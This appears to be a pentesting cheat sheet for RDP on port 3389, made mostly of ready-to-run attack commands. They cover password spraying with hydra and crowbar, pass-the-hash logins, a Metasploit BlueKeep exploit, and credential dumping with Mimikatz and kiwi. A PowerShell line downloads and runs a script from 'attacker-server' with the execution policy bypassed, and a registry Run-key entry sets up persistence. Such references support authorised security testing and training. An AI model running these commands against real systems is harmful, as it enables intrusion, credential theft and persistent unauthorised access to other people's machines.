# 3389 - Pentesting RDP

## Basic Information

RDP (Remote Desktop Protocol) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. RDP allows remote access to the graphical desktop of a computer and is widely used for remote administration tasks.

RDP operates on a client-server model, where the client initiates a connection to the server to access the desktop environment and applications of the remote machine.

**Default port:** 3389

```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## Connect
Connect Using Remote Desktop Connection
You can connect to an RDP server using the Remote Desktop Connection utility on Windows or through third-party clients on other operating systems.
```
mstsc /v:<target-ip>:<port>
```
## Connect Using xfreerdp
xfreerdp is an open-source RDP client available for various platforms, including Linux.
```
xfreerdp /v:<target-ip>:<port>
```
## Enumeration

### Automatic

```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
It checks the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).

### [Brute force](../generic-hacking/brute-force.md#rdp)

**Be careful, you could lock accounts**

### **Password Spraying**

**Be careful, you could lock accounts**

```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
hydra -t 1 -l <username> -P <password-list> rdp://<target-ip>
ncrack -U <username-list> -P <password-list> rdp://<target-ip>
```

### Connect with known credentials/hash

```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
## Exploiting Vulnerabilities
BlueKeep (CVE-2019-0708)
If the target RDP service is running on a certain version of windows, it might be vulnerable to the Bluekeep vulnerability. We can use Metasploit to exploit:
```
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS TARGET_IP
set LHOST YOUR_IP
exploit
```
### Check known credentials against RDP services

rdp\_check.py from impacket let you check if some credentials are valid for a RDP service:

```bash
rdp_check <domain>/<name>:<password>@<IP>
```
## Post-Exploitation
### Dumping Credentials
#### Dumping Credentials with Mimikatz
After gaining access, use Mimikatz to dump credentials and other critical information from memory.
```
Invoke-Mimikatz -DumpCreds
```
## Dumping Credentials with Kiwi
Once you have an RDP session, you can use the kiwi extension to dump credentials from the memory:
```
meterpreter > load kiwi
meterpreter > creds_all
```
## Remote Code Execution (RCE)
Once access is gained to an RDP server, you can execute arbitrary code on the target system, potentially leading to further compromise or data exfiltration.
```
powershell
Invoke-WebRequest -Uri http://attacker-server/malicious-script.ps1 -OutFile C:\temp\malicious-script.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\temp\malicious-script.ps1
```
Running a remote program on the RDP server:
```
psexec \\target-ip -u username -p password "cmd.exe /c \"C:\path\to\executable.exe\""
```
## Persistence
Establishing persistence on the compromised system allows attackers to maintain access even after the initial compromise is remediated.

Tools like adding registry entries or creating scheduled tasks can be used for persistence on Windows systems.
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <key-name> /t REG_SZ /d "<malicious-command>" /f
```
### RDP Process Injection

If someone from a different domain or with **better privileges login via RDP** to the PC where **you are an Admin**, you can **inject** your beacon in his **RDP session process** and act as him:

{% content-ref url="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md)
{% endcontent-ref %}

### Adding User to RDP group

```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```

## Automatic Tools

* [**AutoRDPwn**](https://github.com/JoelGMSec/AutoRDPwn)

**AutoRDPwn** is a post-exploitation framework created in Powershell, designed primarily to automate the **Shadow** attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to **view his victim's desktop without his consent**, and even control it on demand, using tools native to the operating system itself.

* [**EvilRDP**](https://github.com/skelsec/evilrdp)
  * Control mouse and keyboard in an automated way from command line
  * Control clipboard in an automated way from command line
  * Spawn a SOCKS proxy from the client that channels network communication to the target via RDP
  * Execute arbitrary SHELL and PowerShell commands on the target without uploading files
  * Upload and download files to/from the target even when file transfers are disabled on the target

## HackTricks Automatic Commands

```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for RDP
  Note: |
    Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device. 

    https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
  Name: Nmap
  Description: Nmap with RDP Scripts
  Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
